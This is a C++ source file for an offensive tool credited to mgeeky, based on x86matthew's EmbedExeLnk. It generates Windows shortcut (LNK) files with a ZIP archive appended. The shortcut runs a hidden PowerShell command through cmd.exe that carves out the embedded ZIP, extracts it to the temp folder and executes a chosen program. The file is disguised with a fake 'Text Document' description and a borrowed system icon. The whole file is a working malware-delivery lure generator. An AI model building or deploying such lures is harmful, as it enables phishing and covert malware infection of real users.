//
// This program creates an embed-zip LNK, which is a LNK shortcut file with appended ZIP archive.
//
// This is a modified version of x86matthew's EmbedExeLnk program, available here:
//	https://www.x86matthew.com/view_post?id=embed_exe_lnk
//
// Compilation:
//		cmd> cl.exe gen-embed-zip.cpp
//

#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ole32")

#define INVALID_SET_FILE_POINTER 0xFFFFFFFF

#define HasName 0x00000004
#define HasArguments 0x00000020
#define HasIconLocation 0x00000040
#define IsUnicode 0x00000080
#define HasExpString 0x00000200
#define PreferEnvironmentPath 0x02000000

struct ShellLinkHeaderStruct
{
	DWORD dwHeaderSize;
	CLSID LinkCLSID;
	DWORD dwLinkFlags;
	DWORD dwFileAttributes;
	FILETIME CreationTime;
	FILETIME AccessTime;
	FILETIME WriteTime;
	DWORD dwFileSize;
	DWORD dwIconIndex;
	DWORD dwShowCommand;
	WORD wHotKey;
	WORD wReserved1;
	DWORD dwReserved2;
	DWORD dwReserved3;
};

struct EnvironmentVariableDataBlockStruct
{
	DWORD dwBlockSize;
	DWORD dwBlockSignature;
	char szTargetAnsi[MAX_PATH];
	wchar_t wszTargetUnicode[MAX_PATH];
};

DWORD CreateLinkFile(char *pExePath, char *pOutputLinkPath, char *pProgramName, char *pLinkIconPath, char *pLinkDescription)
{
	HANDLE hLinkFile = NULL;
	HANDLE hExeFile = NULL;
	ShellLinkHeaderStruct ShellLinkHeader;
	EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
	DWORD dwBytesWritten = 0;
	WORD wLinkDescriptionLength = 0;
	wchar_t wszLinkDescription[512];
	WORD wCommandLineArgumentsLength = 0;
	wchar_t wszCommandLineArguments[8192];
	WORD wIconLocationLength = 0;
	wchar_t wszIconLocation[512];
	wchar_t wszProgramName[512];
	BYTE bExeDataBuffer[1024];
	DWORD dwBytesRead = 0;
	DWORD dwEndOfLinkPosition = 0;
	DWORD dwCommandLineArgsStartPosition = 0;
	wchar_t *pCmdLinePtr = NULL;
	wchar_t wszOverwriteSkipBytesValue[16];
	wchar_t wszOverwriteSearchLnkFileSizeValue[16];
	DWORD dwTotalFileSize = 0;

	// create link file
	hLinkFile = CreateFile(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hLinkFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create output file\n");
		return 1;
	}

	// initialise link header
	memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
	ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
	CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
	ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
	ShellLinkHeader.dwFileAttributes = 0;
	ShellLinkHeader.CreationTime.dwHighDateTime = 0;
	ShellLinkHeader.CreationTime.dwLowDateTime = 0;
	ShellLinkHeader.AccessTime.dwHighDateTime = 0;
	ShellLinkHeader.AccessTime.dwLowDateTime = 0;
	ShellLinkHeader.WriteTime.dwHighDateTime = 0;
	ShellLinkHeader.WriteTime.dwLowDateTime = 0;
	ShellLinkHeader.dwFileSize = 0;
	ShellLinkHeader.dwIconIndex = 0;
	ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
	ShellLinkHeader.wHotKey = 0;

	// write ShellLinkHeader
	if(WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 1");
		return 1;
	}

	// set link description & program name to run inside of a .zip
	memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
	memset(wszProgramName, 0, sizeof(wszProgramName));

	mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
	mbstowcs(wszProgramName, pProgramName, (sizeof(wszProgramName) / sizeof(wchar_t)) - 1);

	wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);

	// write LinkDescriptionLength
	if(WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 2");
		return 1;
	}

	// write LinkDescription
	if(WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 3");
		return 1;
	}

	// set target command-line
	memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));
	_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c powershell -windowstyle hidden $obf_lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 00000000} ^| Select-Object -ExpandProperty FullName;$obf_file = [system.io.file]::ReadAllBytes($obf_lnkpath);$obf_path = '%%TEMP%%\\tmp'+(Get-Random)+'.zip';$obf_path = [Environment]::ExpandEnvironmentVariables($obf_path);$obf_dir = [System.IO.Path]::GetDirectoryName($obf_path);[System.IO.File]::WriteAllBytes($obf_path, $obf_file[000000..($obf_file.length)]);cd $obf_dir;Expand-Archive -Path $obf_path -DestinationPath . -EA SilentlyContinue -Force ^| Out-Null;Remove-Item -Path $obf_path -EA SilentlyContinue -Force ^| Out-Null;^& .\\%s", "", wszProgramName);

	wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);

	// write CommandLineArgumentsLength
	if(WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 4");
		return 1;
	}

	// store start of command-line arguments position
	dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);

	// write CommandLineArguments
	if(WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 5");
		return 1;
	}

	// set link icon path
	memset(wszIconLocation, 0, sizeof(wszIconLocation));
	mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
	wIconLocationLength = (WORD)wcslen(wszIconLocation);

	// write IconLocationLength
	if(WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 6");
		return 1;
	}

	// write IconLocation
	if(WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 7");
		return 1;
	}

	// initialise environment variable data block
	memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
	EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
	EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
	strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
	mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);

	// write EnvironmentVariableDataBlock
	if(WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 8");
		return 1;
	}

	// store end of link data position
	dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL);

	// open target exe file
	hExeFile = CreateFile(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hExeFile == INVALID_HANDLE_VALUE)
	{
		printf("Could not open ZIP file\n");

		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// append exe file to the end of the lnk file
	for(;;)
	{
		// read data from exe file
		if(ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &dwBytesRead, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);
			printf("Error 9");
			return 1;
		}

		// check for end of file
		if(dwBytesRead == 0)
		{
			break;
		}

		// write data to lnk file
		if(WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &dwBytesWritten, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);
			printf("Error 10");
			return 1;
		}
	}

	// close exe file handle
	CloseHandle(hExeFile);

	// store total file size
	dwTotalFileSize = GetFileSize(hLinkFile, NULL);

	// find the offset value of the number of bytes to skip in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"$obf_file[000000..($obf_file");
	if(pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 11");
		return 1;
	}
	pCmdLinePtr += strlen("$obf_file[");

	// move the file pointer back to the "000000" value in the command-line arguments
	if(SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 12");
		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue));
	_snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L"%06u", dwEndOfLinkPosition);
	if(WriteFile(hLinkFile, (void*)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 14");
		return 1;
	}

	// find the offset value of the total lnk file length in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"{$_.length -eq 00000000}");
	if(pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 15");
		return 1;
	}
	pCmdLinePtr += strlen("{$_.length -eq ");

	// move the file pointer back to the "0x00000000" value in the command-line arguments
	if(SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 16");
		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue));
	_snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L"%08u", dwTotalFileSize);
	if(WriteFile(hLinkFile, (void*)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);
		printf("Error 17");
		return 1;
	}

	// close output file handle
	CloseHandle(hLinkFile);

	return 0;
}

int main(int argc, char *argv[])
{
	char *pExePath = NULL;
	char *pOutputLinkPath = NULL;
	char *pProgramName = NULL;
	char *pIconPath = "%WINDIR%\\System32\\UserAccountControlSettings.exe";

	printf("Embed ZIP to LNK\n\n- Based on EmbedExeLnk idea by: www.x86matthew.com\n- Adapted by: Mariusz Banach / mgeeky, binary-offensive.com\n\n");

	if(argc < 4)
	{
		printf("Usage: %s <zip-path> <output-lnk-path> <what-to-run-in-zip> [icon-path]\n\n", argv[0]);

		return 1;
	}

	// get params
	pExePath = argv[1];
	pOutputLinkPath = argv[2];
	pProgramName = argv[3];
	
	if(argc > 4) {
		pIconPath = argv[4];
	}

	// create a link file containing the target exe - UserAccountControlSettings points to LNK's icon path
	if(CreateLinkFile(
		pExePath, 
		pOutputLinkPath, 
		pProgramName,
		pIconPath,
		"Type: Text Document\nSize: 391,2KB KB\nDate modified: 30/11/2022 14:56"
	) != 0)
	{
		printf("\nLNK generation failed.\n");

		return 1;
	}

	printf("LNK generated: %s\n", pOutputLinkPath);

	return 0;
}